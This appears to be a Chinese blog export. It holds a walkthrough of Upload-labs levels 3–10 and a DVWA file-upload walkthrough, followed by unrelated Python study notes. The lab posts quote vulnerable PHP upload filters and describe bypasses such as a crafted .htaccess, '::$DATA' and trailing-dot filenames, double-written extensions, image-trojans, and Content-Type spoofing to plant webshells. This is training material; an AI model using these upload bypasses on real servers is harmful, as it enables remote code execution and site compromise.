我这里使用的是phpstudy+windows，即使添加了也不管用，查了大师傅的博客才知道是由于配置原因是解析不了php5等等这些后缀的，所以复现不了，可以在虚拟机中复现这关。不过也知道了这一关是采用拓展名绕过查看一下源码123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']);//trim() 函数移除字符串两侧的空白字符或其他预定义字符 $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.');//strrchr() 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。 $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123;//in_array() 函数搜索数组中是否存在指定的值 $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 观察源码就会发现这里确实采用黑名单来限制 方法：拓展名绕过 第四关没什么思路，查看一下提示发现基本上将所有非法的脚本后缀都禁用了，还是黑名单限制，查看一下源码 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 果然是将所有非法的脚本后缀都禁用了，但是没有禁用.htaccess，先来了解一下htaccess文件的作用，.htaccess的基本作用及相关语法介绍 在这里使用htaccess文件目的是为了将所有文件都当成php文件来解析创建一个.htaccess文件1SetHandler application/x-httpd-php 在文件中写入该段代码，上传时将文件名去掉，只要后缀名上传后，上传图片马，由于连接菜刀麻烦，这里就修改一句话语句为1&lt;?php phpinfo(); ?&gt; 上传图片马成功后，进行查看解析成功 方法：.htaccess文件进行绕过 第五关上传.htaccess文件，发现该后缀名也被加入黑名单了查看源码1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 通过观察，发现黑名单中限制的后缀名没有将大小写统一，采用大小写方式进行绕过上传成功，进行查看 方法：大小写绕过 第六关无论如果改后缀名都无法上传，说明这关代码已经统一了大小写查看源码 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 还是采用了黑名单来进行限制，不过与前几关先比较会发现少了这一行代码 1$file_ext = trim($file_ext); //首尾去空 那么就可以采用后缀名中加空绕过在后缀名中加入空格.php空格，再发包，上传成功 方法：后缀名加空绕过 第七关查看源码 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 还是黑名单，这次又有什么不一样的，通过与前几关对比发现少了这行代码 1$file_name = deldot($file_name);//删除文件名末尾的点 所以可以采用后缀名加.的方式绕过，在这之前，先来了解一下对Windows系统文件命名规则的特殊利用 1234567891011 shell.php. ———-文件名后加点‘.’ shell.php(空格) ———-文件名后加括号空格 shell.php:1.jpg ———-文件名后加冒号’:’ shell.php::$DATA ———-文件名后加NTFS ADS特性::$DATA shell.php::$DATA…… ———-文件名后::$DATA……会被windows系统自动去掉不符合规则符号后面的内容。 windows系统文件命名规则的特殊利用 因此我们可以先抓包然后在后缀名后加上.，文件上传时由于不符合windows文件命名规则而将.去掉，从而将.php的文件上传进去 访问绕过方法：后缀名加.绕过 第八关查看源码 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 还是黑名单限制，观察一下与之前有那些不同 发现少了这一段代码1$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA 没有去除字符串::$DATA，根据Windows系统文件命名规则进行抓包修改即可1shell.php::$DATA ———-文件名后加NTFS ADS特性::$DATA 原理和第七关类似访问成功绕过方法：后缀名加::$DATA绕过 第九关查看源码 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 观察看与前几关的代码有什么不同的地方，发现1$img_path = UPLOAD_PATH.'/'.$file_name; 路径拼接的是处理后的文件名$file_name，而不是$file_ext，也就是说最后保存文件的时候没有重命名而使用的原始的文件名，那相当于$file_name只经过那两段代码的过滤12$file_name = trim($_FILES['upload_file']['name']);//移除字符串两侧的空白字符$file_name = deldot($file_name);//删除文件名末尾的点 那就可以采用后缀名（点+空格+点）的方法来绕过上传时，代码会先将末尾的.去除，剩余.+空格，利用Windows系统文件命名规则，windows会忽略文件末尾的.和空格，这样即可上传进取 绕过方法：后缀名+.+空格+.进行绕过 第十关查看源码 123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;#str_ireplace() 函数替换字符串中的一些字符（不区分大小写）/*str_ireplace(find,replace,string,count)find 必需。规定要查找的值。replace 必需。规定替换 find 中的值的值。string 必需。规定被搜索的字符串。*/ 这一段代码将后缀名全部替换成了空1$file_name = str_ireplace($deny_ext,\"\", $file_name); 之前学习XSS时也碰到这种情况，可以采用双写进行绕过过滤了php，前后再拼接成PHP访问成功： 绕过方法：双写绕过 总结：通过这十关又学到了很多文件上传的技巧，下次继续学习后十关，这次先学习到这里。","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"http://bealright.github.io/tags/文件上传/"}]},{"title":"文件上传漏洞——DVWA练习","slug":"文件上传漏洞——DVWA练习","date":"2019-07-31T12:01:24.000Z","updated":"2019-08-07T03:28:54.618Z","comments":true,"path":"2019/07/31/文件上传漏洞——DVWA练习/","link":"","permalink":"http://bealright.github.io/2019/07/31/文件上传漏洞——DVWA练习/","excerpt":"","text":"前言：文件上传漏洞是很常见的漏洞，也非常有趣，接下来就在DVWA靶场中边学边练。 文件上传漏洞： 文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。 具体的原理可以看大师傅的讲解Smi1e_——文件上传漏洞 学习笔记文件上传漏洞 low级别观察源码 12345678910111213141516171819202122&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );# $_FILES[\"file\"][\"name\"] - 被上传文件的名称# $_FILES[\"file\"][\"tmp_name\"] - 存储在服务器的文件的临时副本的名称# basename() 函数返回路径中的文件名部分 // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; # move_uploaded_file() 函数将上传的文件移动到新位置 // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo \"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;\"; &#125;&#125;?&gt; 通过对源码的分析，我们发现没有任何防护和限制，那就构造一句话木马进行上传根据相应的路径进行菜刀连接即可 Medium级别上传刚才一句话木马试一下，发现只能上传JPG或者是PNG，那就来查看一下源码 123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; // Is it an image? if( ( $uploaded_type == \"image/jpeg\" || $uploaded_type == \"image/png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo \"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;\"; &#125; &#125; else &#123; // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125;&#125;?&gt; 通过分析源码，发现只有这一段代码进行了限制 12if( ( $uploaded_type == \"image/jpeg\" || $uploaded_type == \"image/png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) 只能上传jpeg或png的图像，限制了大小，其他没有任何防护，那就可以用一句话木马图片 一句话木马图片的制作一、建立一个bat文件，用记事本打开输入cmd二、将上传的图片和一句话php文件执行以下命令即可1copy 图片1.jpg/b+PHP文件2.php/a 自定义图片名3.jpg 发现一句话确实已经插入图片中上传成功，用菜刀连接结果连接不上去，这里我们上传的是一张图片，那对方服务器就认为我们上传的是一张很正常的图，因此只会当做图片来解析，所以图片里的php代码不会被解析了，这里需要了解文件包含漏洞才能将图片进行解析。因为文件包含漏洞也是很好玩的知识，这里就不详细写了，之后单独总结出一篇博客来学习文件包含漏洞 我这里上传的是3.jpg在url地址栏中输入1http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file://D:\\PHPstudy\\PHPTutorial\\WWW\\DVWA\\hackable\\uploads\\3.jpg 发现图片已经被解析了，那么PHP代码也肯定被服务器解析了，用菜刀进行连接结果还是连不上去，发现有三行警告 警告：无法修改头信息 做到这里实在连不上去，不知道是什么原因，这种方法就暂时先留到这，等找到解决方法了再继续做 除下这种方法还可以用抓包修改文件的type通过观察这两段代码 12if( ( $uploaded_type == \"image/jpeg\" || $uploaded_type == \"image/png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; 只是限制了Content-Type，没有限制后缀名，所以这里可以直接抓包修改Content-Type即可发包，上传成功访问成功这里为了方便就不连接菜刀了，将一句话木马改为1&lt;?php phpinfo(); ?&gt; High级别查看源码 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == \"jpg\" || strtolower( $uploaded_ext ) == \"jpeg\" || strtolower( $uploaded_ext ) == \"png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo \"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;\"; &#125; &#125; else &#123; // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125;&#125;#$_FILES['myFile']['name'] 显示客户端文件的原名称。#$_FILES['myFile']['type'] 文件的 MIME 类型，例如\"image/gif\"。#$_FILES['myFile']['size'] 已上传文件的大小，单位为字节。#$_FILES['myFile']['tmp_name'] 储存的临时文件名，一般是系统默认。#$_FILES['myFile']['error'] 该文件上传相关的错误代码。以下为不同代码代表的意思：#strtolower() 函数把字符串转换为小写#getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。#strrpos() 函数查找字符串在另一字符串中最后一次出现的位置?&gt; 观察源码发现，代码中增加了一段代码1$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 并且修改了这一段代码 123if( ( strtolower( $uploaded_ext ) == \"jpg\" || strtolower( $uploaded_ext ) == \"jpeg\" || strtolower( $uploaded_ext ) == \"png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) 先来解读一下第一段代码，strrpos()函数查找.出现在$uploaded_name的位置然后加1，再利用substr()函数从变量$uploaded_name的指定位置截取部分字符串。所以这段代码的作用就是为了截取上传文件的后缀名 第二段代码，strtolower()函数将无论是大写或小写的后缀名全改为小写，以防大小写绕过，并且getimagesize() 函数用于获取图像大小及相关信息，所以这里再用之前的php文件后缀名改为jpg或png就不可行了，不过也可以利用这个函数的漏洞进行绕过，既然对文件的开头内容进行了检测并且通过二进制识别是否为图像，那么就可以利用文件头欺骗，来让getimagesize()函数检测无效。 先了解一下常用图片的文件头标识通过文件头标识判断图片格式文件头欺骗 getimagesize() 函数在这里作用就是检测是否为图像的作用，这里就用最简便的GIF的文件头，在一句话木马前加上GIF的文件头标识上传上传成功，说明成功绕过 用文件包含来进行访问1http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file:///D:\\phpStudy1\\PHPTutorial\\WWW\\DVWA\\hackable\\uploads\\2.jpg 但应该是我配置有问题，我的文件包含报错，但这种方法没错 除此之外那，也可以上传图片马，然后用文件包含进行解析，由于我这里配置的有问题就不再演示了，不过这种方法确实是可行的，看过许多大师傅们都是这样做的，除了这几种方法外，还有%00截断，这个方法也不在这里演示了，因为是适用于php小于 5.3.4 版本。 总结：虽然遇到了很多问题，不过也初步了解了文件上传漏洞的原理和一些姿势，接下来通过Upload-labs进行学习。","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"http://bealright.github.io/tags/文件上传/"}]},{"title":"python学习（字典、用户输入和while循环）","slug":"python学习（字典、用户输入和while循环）","date":"2019-07-29T11:22:21.000Z","updated":"2019-08-01T01:00:02.161Z","comments":true,"path":"2019/07/29/python学习（字典、用户输入和while循环）/","link":"","permalink":"http://bealright.github.io/2019/07/29/python学习（字典、用户输入和while循环）/","excerpt":"","text":"前言：上次学习到了if语句，这次接着进行学习。 字典 字典能够准确地为各种真实物体建模，且能够将相关信息关联起来。 使用字典 字典是一系列的键——值对，一个建对应一个值，值可以为数字、字符串等在Python中，字典用放在花括号{} 中的一系列键—值对表示。 访问字典中的值1234567score = &#123;'shuxu':'80','yuwen':'90'&#125;print(score['shuxu'])print(score['yuwen'])#输出结果：8090 添加键——值对 字典是一种动态结构，可随时在其中添加键—值对添加时值用方括号[]括起来 12345678910score = &#123;'shuxu':'80','yuwen':'90'&#125;print(score)score['wuli'] = 60score['yingyu'] = 90print(score)#输出结果：&#123;'shuxu': '80', 'yuwen': '90'&#125;&#123;'shuxu': '80', 'yuwen': '90', 'wuli': 60, 'yingyu': 90&#125; 创建一个空字典1234567score = &#123;&#125;score['wuli'] = 60score['yingyu'] = 90print(score)#输出结果：&#123;'wuli': 60, 'yingyu': 90&#125; 修改字典中的值1234567score = &#123;'yuwen':'80'&#125;print(score)score['yuwen'] = '90'print(score)#输出结果：&#123;'yuwen': '80'&#125;&#123;'yuwen': '90'&#125; 删除键——值对 使用del 语句可以将相应的键—值对彻底删除，使用del 语句时，必须指定字典名和要删除的键。 1234567score = &#123;'yuwen':80,'shuxu':90&#125;print(score)del score['shuxu']print(score)#输出结果：&#123;'yuwen': 80, 'shuxu': 90&#125;&#123;'yuwen': 80&#125; 由类似对象组成的字典如果用字典来存储众多对象的同一种信息，可以用这样的形式 12345678910yuwen_score = &#123; 'me': '90', 'you':'80', 'he':'70', 'she':'60', &#125;print(\"he score is\"+ yuwen_score['he'])#输出结果：he score is70 遍历所有的键——值对 遍历键值——对时，可声明两个变量，用于存储键—值对中的键和值。对于这两个变量，可使用任何名称。12345678910111213141516171819202122yuwen_score = &#123; 'me': '90', 'you':'80', 'he':'70', 'she':'60', &#125;for key,value in yuwen_score.items(): print(\"\\nkey: \" + key) print(\"value: \" + value)#items() 函数以列表返回可遍历的(键, 值) 元组数组。#输出结果：key: mevalue: 90key: youvalue: 80key: hevalue: 70key: shevalue: 60 遍历字典中的所有键 keys() 函数返回一个列表包含所有键 12345678910111213141516yuwen_score = &#123; 'me': '90', 'you':'80', 'he':'70', 'she':'60', &#125;for key in yuwen_score.keys(): print(\"\\nkey: \" + key)#输出结果：key: mekey: youkey: hekey: she 按顺序遍历字典中的所有值 函数sorted() 来获得按特定顺序排列的键列表的副本 12345678910111213141516yuwen_score = &#123; 'me': '90', 'you':'80', 'he':'70', 'she':'60', &#125;for key in sorted(yuwen_score.keys()): print(\"\\nkey: \" + key)#输出结果：key: hekey: mekey: shekey: you 遍历字典中的所有值 方法values() ，返回一个值列表，不包含任何键。 12345678910111213141516yuwen_score = &#123; 'me': '90', 'you':'80', 'he':'70', 'she':'60', &#125;for score in yuwen_score.values(): print(\"\\nscore: \" + score)#输出结果：score: 90score: 80score: 70score: 60 如果值中有重复的，可以用集合set，如： 1234567891011121314yuwen_score = &#123; 'me': '90', 'you':'80', 'he':'70', 'she':'90', &#125;for score in set(yuwen_score.values()): print(\"\\nscore: \" + score)#输出结果：score: 90score: 80score: 70 嵌套 将一系列字典存储在列表中，或将列表作为值存储在字典中，这称为嵌套 字典列表123456789101112score_0 = &#123;'subject':'yuwen','point':60&#125;score_1 = &#123;'subject':'shuxu','point':70&#125;score_2 = &#123;'subject':'yingyu','point':80&#125;scores = [score_0,score_1,score_2]for score in scores: print(score)#输出结果：&#123;'subject': 'yuwen', 'point': 60&#125;&#123;'subject': 'shuxu', 'point': 70&#125;&#123;'subject': 'yingyu', 'point': 80&#125; 在字典中储存列表 每当需要在字典中将一个键关联到多个值时，都可以在字典中嵌套一个列表。 123456789101112school = &#123; 'teacher': 'wang', 'subjects': ['shuxu','yuwen'], &#125;print(school['teacher'])for subject in school['subjects']: print(\"\\t\" + subject)#输出结果：wang shuxu yuwen 用户输入和while循环函数input 函数input() 让程序暂停运行，等待用户输入一些文本。获取用户输入后，Python将其存储在一个变量中。使用函数input() 时，输入解读为字符串。 123456message = input(\"please input message:\\n\")print(\"message is:\"+message)#输出结果：please input message:22222message is:22222 函数int 使用函数int() 来获取数值输入 ,input（）解读的为字符串，不能直接和整数比较 将数值输入用于计算和比较前，需将其转换为数值表示. 求模运算符 %，将两个数相除并返回余数 1234567print(4 % 3)print(5 % 3)print(6 % 3)#输出结果:120 使用while 循环 通过一个例子来了解while的语法 12345678910number = 1while number &lt;= 5: print(number) number +=1#输出结果：12345 在循环中使用continue 返回到循环开头，并根据条件测试结果决定是否继续执行循环 12345678910111213number = 0while number &lt;10: number += 1 if number % 2 ==0: continue print(number) #输出结果： 13579 在列表之间移动元素12345678910111213numbers = ['a','b','c']confirmed_numbers = []while numbers: middle_number = numbers.pop()#删除末尾赋给新的变量 confirmed_numbers.append(middle_number)for confirmed_number in confirmed_numbers: print(confirmed_number.title())#输出结果：CBA 删除包含特定值的所有列表元素12345678910messages = ['a','b','c','d','a','a']print(messages)while 'a' in messages: messages.remove('a')print(messages)#输出结果：['a', 'b', 'c', 'd', 'a', 'a']['b', 'c', 'd'] 使用用户输入来填充字典 12345678910111213141516171819202122#创建一个空字典responses = &#123;&#125;#设置一个标志active = Truewhile active: name = input(\"\\nWhat is your name?\") like_food = input(\"your like food is ?\") #将答案存储在字典中 responses[name] = like_food repeat = input(\"Would you like to let another person respond? (yes/ no) \") if repeat =='no': active = Falsefor name,like_food in responses.items(): print(name+\":\"+like_food)#输出结果：What is your name?222your like food is ?222Would you like to let another person respond? (yes/ no) no222:222 